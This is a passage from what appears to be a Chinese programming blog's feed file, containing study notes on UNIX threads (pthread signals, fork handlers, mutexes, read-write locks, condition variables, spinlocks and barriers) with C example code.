oset)</span>;</span><br></pre></td></tr></table></figure><p>需要注意的是，如果在主线程中屏蔽了一些信号，那么被创建的线程会继承当前的信号屏蔽字。</p><p>线程可以通过<code>sigwait</code>函数等待一个或多个信号出现。如果多个线程通过该函数等待信号，则在传递信号的时候，只有一个线程可以从该函数返回。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigwait</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="keyword">restrict</span> <span class="built_in">set</span>, <span class="type">int</span> *<span class="keyword">restrict</span> signop)</span>;</span><br></pre></td></tr></table></figure><p>可以调用<code>pthread_kill</code>函数将信号发送给指定的线程（需属于同一进程）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_kill</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="type">int</span> signo)</span>;</span><br></pre></td></tr></table></figure><p>另外，如果传递给<code>signo</code>的值是<strong>0</strong>，则可以用来检测线程是否存在。如果接收信号的线程没有对应的处理函数，则该信号会发送给主线程[1]。相关测试见ch12/pthread_kill.c，摘录主要代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> err;</span><br><span class="line">  <span class="type">sigset_t</span> mask, old;</span><br><span class="line">  <span class="type">pthread_t</span> pt1, pt2;</span><br><span class="line"></span><br><span class="line">  sigemptyset(&amp;mask);</span><br><span class="line">  sigaddset(&amp;mask, SIGQUIT); <span class="comment">/* 如果不屏蔽QUIT信号，则主线程会收到该信号 */</span></span><br><span class="line">  sigaddset(&amp;mask, SIGINT);</span><br><span class="line">  err = pthread_sigmask(SIG_BLOCK, &amp;mask, &amp;old);</span><br><span class="line">  assert(err == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  signal(SIGQUIT, main_q); <span class="comment">/* QUIT信号处理函数 */</span></span><br><span class="line"></span><br><span class="line">  err = pthread_create(&amp;pt1, <span class="literal">NULL</span>, th1, <span class="literal">NULL</span>);</span><br><span class="line">  assert(err == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;main:send QUIT signal.\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 线程1未屏蔽QUIT信号，但没有处理程序，会返回给主线程</span></span><br><span class="line">  pthread_kill(pt1, SIGQUIT);</span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 线程1</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">th1</span><span class="params">(<span class="type">void</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> err, signo;</span><br><span class="line">  <span class="type">sigset_t</span> mask;</span><br><span class="line"></span><br><span class="line">  sigemptyset(&amp;mask);</span><br><span class="line">  sigaddset(&amp;mask, SIGINT);</span><br><span class="line">  pthread_sigmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    err = sigwait(&amp;mask, &amp;signo);</span><br><span class="line">    assert(err == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">switch</span> (signo) &#123;</span><br><span class="line">      <span class="keyword">case</span> SIGINT:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nth1:INT.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nth1:unexcepted signal %d.\n&quot;</span>, signo);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在多线程中，一般安排专用线程处理信号，通过互斥量的保护，信号处理线程可以安全地改动数据。</p><h1>fork</h1><p>线程调用fork时，为子进程创建了整个进程地址空间的副本，同时还继承了互斥量、读写锁和条件变量的状态。为此，子进程返回后，如果不是马上调用exec，则需要清理锁的状态。因为子进程中只含有调用fork的那个线程的副本，父进程中其他占有锁的线程在子进程中不存在。</p><p>要清除锁的状态，可以使用<code>pthread_atfork</code>函数建立fork处理程序。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_atfork</span><span class="params">(<span class="type">void</span> (*prepare)(<span class="type">void</span>), <span class="type">void</span> (*parent)(<span class="type">void</span>),</span></span><br><span class="line"><span class="params">                  <span class="type">void</span> (*child)(<span class="type">void</span>))</span>;</span><br></pre></td></tr></table></figure><ul><li><code>prepare</code>由父进程在fork创建子进程前调用。任务是获取父进程定义的所有锁。</li><li><code>parent</code>在fork创建子进程后、返回之前在父进程上下文中调用。任务是对获取的所有锁进行解锁。</li><li><code>child</code>在fork返回前在子进程上下文中调用。任务是释放所有的锁。</li></ul><p>可以多次调用该函数以设置多套fork处理程序。对于不需要的某个处理程序，可以传入空指针。多次调用时，<code>parent</code>和<code>child</code>以注册时的顺序执行，而<code>prepare</code>的执行顺序与注册时相反。</p><p>使用方法参考ch12/pthread_atfork.c。</p><h1>参考</h1><ol><li><a href="https://blog.csdn.net/vah101/article/details/40393287">pthread_kill 使用方法_vah101的专栏-CSDN博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apue </tag>
            
            <tag> thread </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX环境高级编程（11-线程）</title>
      <link href="/posts/3649803512.html"/>
      <url>/posts/3649803512.html</url>
      
        <content type="html"><![CDATA[<p>本章主要介绍线程的概念，创建和终止线程以及线程同步问题。</p><p>使用到的函数默认需要包含pthread.h头文件，且在使用gcc编译时，需要链接pthread库。</p><p>代码地址：<a href="https://gitee.com/maxiaowei/Linux/tree/master/apue">https://gitee.com/maxiaowei/Linux/tree/master/apue</a></p><h1>线程的创建与终止</h1><h2 id="创建线程">创建线程</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *<span class="keyword">restrict</span> tidp,</span></span><br><span class="line"><span class="params">                   <span class="type">const</span> <span class="type">pthread_attr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *(*start_rtn)(<span class="type">void</span> *), <span class="type">void</span> *<span class="keyword">restrict</span> arg)</span>;</span><br></pre></td></tr></table></figure><p>新创建的线程的线程ID被设置成<code>tidp</code>指向的内存单元；<code>attr</code>参数定制线程的不同属性；<code>start_rtn</code>函数是线程开始时执行的函数，其参数可以通过<code>arg</code>进行传递。</p><p><strong>注意：</strong></p><p>新线程最好不要通过<code>tidp</code>指向的内存空间获取自己的线程ID，因为如果新线程在主线程调用<code>pthread_create</code>返回前就运行了，那么它看到的就是未经初始化的内容，很可能并不是正确的线程ID。可以使用<code>pthread_self</code>函数获取自己的线程ID。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_t</span> <span class="title function_">pthread_self</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="终止线程">终止线程</h2><p>任意线程调用<code>exit</code>、<code>_Exit</code>或<code>_exit</code>会导致整个进程终止，可以通过以下3种方式，在不终止进程的前提下终止单个线程：</p><ol><li>直接从启动实例中返回</li><li>被同一进程的其他线程取消</li><li>调用<code>pthread_exit</code></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pthread_exit</span><span class="params">(<span class="type">void</span> *rval_ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="type">void</span> **rval_ptr)</span>;</span><br></pre></td></tr></table></figure><p>调用<code>pthread_join</code>的线程会一直阻塞，直到指定的线程终止。如果指定的线程直接返回或者是调用<code>pthread_exit</code>终止，则可以通过<code>rval_ptr</code>查看其返回值；如果线程是被取消的，则<code>rval_ptr</code>被设置为<code>PTHRERAD_CANCELED</code>。</p><h3 id="取消线程">取消线程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_cancel</span><span class="params">(<span class="type">pthread_t</span> tid)</span>;</span><br></pre></td></tr></table></figure><p>用来<strong>请求</strong>取消同一进程中的其他线程。被取消的线程的行为表现为如同调用了参数为<code>PTHRERAD_CANCELED</code>的<code>pthread_exit</code>函数。<strong>但是，线程可以选择忽略或者控制如何被取消。</strong></p><h3 id="线程清理处理程序">线程清理处理程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pthread_cleanup_push</span><span class="params">(<span class="type">void</span> (*rtn)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pthread_cleanup_pop</span><span class="params">(<span class="type">int</span> execute)</span>;</span><br></pre></td></tr></table></figure><p>清理函数<code>rtn</code>只有在以下情况会执行：</p><ol><li>调用<code>pthread_exit</code></li><li>响应取消请求</li><li>用<strong>非零</strong><code>execute</code>参数调用pthread_cleanup_pop（为0时，清理函数不会被调用）</li></ol><p><strong>这两个函数需要成对使用</strong>。</p><h3 id="分离线程">分离线程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_detach</span><span class="params">(<span class="type">pthread_t</span> tid)</span>;</span><br></pre></td></tr></table></figure><p>默认情况下，线程的终止状态会保留，直到调用<code>pthread_join</code>。如果线程被分离，则资源会在线程终止后被立即收回。</p><h1>线程同步</h1><h2 id="互斥量mutex">互斥量mutex</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_init</span><span class="params">(<span class="type">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex,</span></span><br><span class="line"><span class="params">                     <span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *<span class="keyword">restrict</span> attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_destroy</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_trylock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_unlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></table></figure><p>互斥变量为<code>pthread_mutex_t</code>类型，如果使用静态分配方式，可以直接使用<code>PTHREAD_MUTEX_INITIALIZER</code>进行初始化。对于动态分配的互斥量，在释放内存前需要调用<code>pthread_mutex_destroy</code>。</p><h3 id="带有超时的互斥锁">带有超时的互斥锁</h3><p>如果不希望线程在访问加锁的互斥量时无限等待，可以通过<code>pthread_mutex_timedlock</code>指定等待的<strong>绝对</strong>时间。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timedlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex,</span></span><br><span class="line"><span class="params">                          <span class="type">const</span> <span class="keyword">struct</span> timespec *<span class="keyword">restrict</span> tsptr)</span>;</span><br></pre></td></tr></table></figure><h3 id="示例">示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;apue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> err;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">tout</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tmp</span>;</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">  <span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加锁</span></span><br><span class="line">  pthread_mutex_lock(&amp;lock);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mutex is locked.\n&quot;</span>);</span><br><span class="line">  clock_gettime(CLOCK_REALTIME, &amp;tout);</span><br><span class="line">  tmp = localtime(&amp;tout.tv_sec);</span><br><span class="line">  strftime(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;%r&quot;</span>, tmp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current time is %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置超时</span></span><br><span class="line">  tout.tv_sec += <span class="number">10</span>;</span><br><span class="line">  err = pthread_mutex_timedlock(&amp;lock, &amp;tout);</span><br><span class="line">  clock_gettime(CLOCK_REALTIME, &amp;tout);</span><br><span class="line">  tmp = localtime(&amp;tout.tv_sec);</span><br><span class="line">  strftime(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;%r&quot;</span>, tmp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;the time is now %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(err == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mutex locked.\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t lock mutex:%s\n&quot;</span>,strerror(err));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="读写锁rwlock">读写锁rwlock</h2><p>读写锁有3中状态：不加锁、读模式加锁和写模式加锁。一次只有<u>一个线程</u>可以占有<u>写模式</u>的读写锁，但是<u>多个线程</u>可以同时占有<u>读模式</u>的读写锁。</p><blockquote><p>读写锁适合对数据结构读的次数远大于写的情况。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_init</span><span class="params">(<span class="type">pthread_rwlock_t</span> *<span class="keyword">restrict</span> rwlock,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">pthread_rwlockattr_t</span> *<span class="keyword">restrict</span> attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_destroy</span><span class="params">(<span class="type">pthread_rwlock_t</span> *rwlock)</span>;</span><br></pre></td></tr></table></figure><p>读写锁在使用前必须初始化，<strong>在释放它们底层的内存前必须销毁</strong>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_rdlock</span><span class="params">(<span class="type">pthread_rwlock_t</span> *rwlock)</span>; <span class="comment">// 读模式锁定</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_wrlock</span><span class="params">(<span class="type">pthread_rwlock_t</span> *rwlock)</span>; <span class="comment">// 写模式锁定</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_unlock</span><span class="params">(<span class="type">pthread_rwlock_t</span> *rwlock)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_tryrdlock</span><span class="params">(<span class="type">pthread_rwlock_t</span> *rwlock)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_trywrlock</span><span class="params">(<span class="type">pthread_rwlock_t</span> *rwlock)</span>;</span><br></pre></td></tr></table></figure><h3 id="带有超时的读写锁">带有超时的读写锁</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_timedrdlock</span><span class="params">(<span class="type">pthread_rwlock_t</span> *<span class="keyword">restrict</span> rwlock,</span></span><br><span class="line"><span class="params">                             <span class="type">const</span> <span class="keyword">struct</span> timespec *<span class="keyword">restrict</span> tsptr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_rwlock_timedwrlock</span><span class="params">(<span class="type">pthread_rwlock_t</span> *<span class="keyword">restrict</span> rwlock,</span></span><br><span class="line"><span class="params">                             <span class="type">const</span> <span class="keyword">struct</span> timespec *<span class="keyword">restrict</span> tsptr)</span>;</span><br></pre></td></tr></table></figure><p>与互斥量类似。</p><h2 id="条件变量cond">条件变量cond</h2><p>当线程等待的条件变量被满足后，该线程就会被唤醒。<strong>条件变量需要和互斥量配合使用</strong>，条件本身是由互斥量保护的。</p><p>在使用条件变量之前，必须对其进行初始化（有静态和动态2种方式）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_cond_init</span><span class="params">(<span class="type">pthread_cond_t</span> *<span class="keyword">restrict</span> cond,</span></span><br><span class="line"><span class="params">                    <span class="type">const</span> <span class="type">pthread_condattr_t</span> *<span class="keyword">restrict</span> attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_cond_destroy</span><span class="params">(<span class="type">pthread_cond_t</span> *cond)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_cond_wait</span><span class="params">(<span class="type">pthread_cond_t</span> *<span class="keyword">restrict</span> cond,</span></span><br><span class="line"><span class="params">                    <span class="type">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_cond_timedwait</span><span class="params">(<span class="type">pthread_cond_t</span> *<span class="keyword">restrict</span> cond,</span></span><br><span class="line"><span class="params">                         <span class="type">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex,</span></span><br><span class="line"><span class="params">                         <span class="type">const</span> <span class="keyword">struct</span> timespec *<span class="keyword">restrict</span> tsptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_cond_signal</span><span class="params">(<span class="type">pthread_cond_t</span> *cond)</span>;    <span class="comment">// 至少唤醒一个</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_cond_broadcast</span><span class="params">(<span class="type">pthread_cond_t</span> *cond)</span>; <span class="comment">// 全部唤醒</span></span><br></pre></td></tr></table></figure><p><code>pthread_cond_wait</code>操作主要执行如下操作步骤：</p><blockquote><p>1.解锁互斥量mutex<br>2.阻塞调用线程，直至另一线程就条件变量cond发出信号<br>3.重新锁定mutex</p><footer><strong>Michael</strong><cite>Linux/UNIX系统编程手册</cite></footer></blockquote><p>因此，在使用<code>pthread_cond_wait</code>函数之前，应该已经取得mutex锁。</p><p>另外，对<code>pthread_cond_wait</code>的调用应该放在while循环中，因为从wait</p><p>函数返回时，并不能确定条件已经得到满足（其他线程先醒来、虚假唤醒等），需要重新对条件进行判断。</p><h3 id="示例-2">示例</h3><p>仅摘录主要代码，完整代码见ch11/pthread_cond.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 消费者进程</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">process_msg</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    pthread_mutex_lock(&amp;qlock);</span><br><span class="line">    <span class="keyword">while</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s wait msg\n&quot;</span>, tag);</span><br><span class="line">      pthread_cond_wait(&amp;qready, &amp;qlock);</span><br><span class="line">    &#125;</span><br><span class="line">    count--;</span><br><span class="line">    pthread_mutex_unlock(&amp;qlock);</span><br><span class="line">    <span class="comment">/* 处理消息 */</span></span><br><span class="line">    <span class="comment">// 放弃cpu，让另一个处理进场有机会得到数据</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 生产者进程</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    pthread_mutex_lock(&amp;qlock);</span><br><span class="line">    count += <span class="number">4</span>;</span><br><span class="line">    pthread_mutex_unlock(&amp;qlock);</span><br><span class="line">    <span class="comment">// 测试两种唤醒方式</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">    pthread_cond_broadcast(&amp;qready);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    pthread_cond_signal(&amp;qready);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 保证两个消费者进程都可以有时间处理数据</span></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自旋锁spin">自旋锁spin</h2><p>自旋锁与互斥量大体类似，主要的不同之处在于<strong>自旋锁在获取锁之前会一直忙等</strong>。因此，使用自旋锁应该保证持有锁的时间很短。</p><p>自旋锁和互斥量的接口类似：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// All return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_spin_init</span><span class="params">(<span class="type">pthread_spinlock_t</span> *lock, <span class="type">int</span> pshared)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_spin_destroy</span><span class="params">(<span class="type">pthread_spinlock_t</span> *lock)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_spin_lock</span><span class="params">(<span class="type">pthread_spinlock_t</span> *lock)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_spin_trylock</span><span class="params">(<span class="type">pthread_spinlock_t</span> *lock)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_spin_unlock</span><span class="params">(<span class="type">pthread_spinlock_t</span> *lock)</span>;</span><br></pre></td></tr></table></figure><p><code>pshared</code>表示进程共享（process-shared）属性，表明自旋锁的获取方式。它仅在支持线程进程共享同步（Thread Process-Shared Synchronization）的平台上有效，当设置为<code>PTHREAD_PROCESS_SHARED</code>，则只要线程可以访问锁底层内存，即使是不同进程的线程都可以获得锁；而设置为<code>PTHREAD_PROCESS_PRIVATE</code>后，只有初始化该锁的进程内部的线程可以访问它。</p><h2 id="屏障barrier">屏障barrier</h2><p>屏障允许<strong>多个线程</strong>等待，直到所有合作线程满足某个点后，从该点继续执行。主线程可以将某个任务分解多个小任务交给不同的线程，等到所有线程工作完成后，主线程在此基础上继续执行。</p><p>如书中的例子，使用8个线程分解800万个数的排序工作，每个线程对其中的100万个数排序，最后由主线程将这些结果进行合并。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_barrier_init</span><span class="params">(<span class="type">pthread_barrier_t</span> *<span class="keyword">restrict</span> barrier,</span></span><br><span class="line"><span class="params">                       <span class="type">const</span> <span class="type">pthread_barrierattr_t</span> *<span class="keyword">restrict</span> attr,</span></span><br><span class="line"><span class="params">                       <span class="type">unsigned</span> <span class="type">int</span> count)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_barrier_destroy</span><span class="params">(<span class="type">pthread_barrier_t</span> *barrier)</span>;</span><br></pre></td></tr></table></figure><p>初始化函数中的<code>count</code>参数用于指定所有线程继续运行前，必须到达屏障的线程数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 or PTHREAD_BARRIER_SERIAL_THREAD if OK, error number on failure</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_barrier_wait</span><span class="params">(<span class="type">pthread_barrier_t</span> *barrier)</span>;</span><br></pre></td></tr></table></figure><p>wait函数表明当前线程已完成工作，准备等待其他线程。当线程调用该函数后满足屏障计数，那么函数的返回值为<code>PTHREAD_BARRIER_SERIAL_THREAD</code>，其余线程该函数返回值为0。这一特点使得可以很容易的将一个线程作为主线程，它可以工作在其他所有线程已完成的工作结果上。</p><h3 id="示例-3">示例</h3><p>见ch11/pthread_barrier.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;apue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_barrier_t</span> pb;</span><br><span class="line"><span class="type">pthread_t</span> t1, t2;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">th1</span><span class="params">(<span class="type">void</span> *a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;start t1\n&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 最后一个完成的线程，返回值应该为-1</span></span><br><span class="line">  <span class="type">int</span> r = pthread_barrier_wait(&amp;pb);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;th1  r:%d\n&quot;</span>, r);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">th2</span><span class="params">(<span class="type">void</span> *a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;start t2\n&quot;</span>);</span><br><span class="line">  <span class="type">int</span> r = pthread_barrier_wait(&amp;pb);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;th2  r:%d\n&quot;</span>, r);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line">  pthread_barrier_init(&amp;pb, <span class="literal">NULL</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;t1, <span class="literal">NULL</span>, th1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_create(&amp;t2, <span class="literal">NULL</span>, th2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  r = pthread_barrier_wait(&amp;pb);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;main r:%d\n&quot;</span>, r);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 等待子进程结束</span></span><br><span class="line">  pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apue </tag>
            
            <tag> thread </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C专家编程(4)</title>
      <link href="/posts/3268952981.html"/>
      <url>/posts/3268952981.html</url>
      
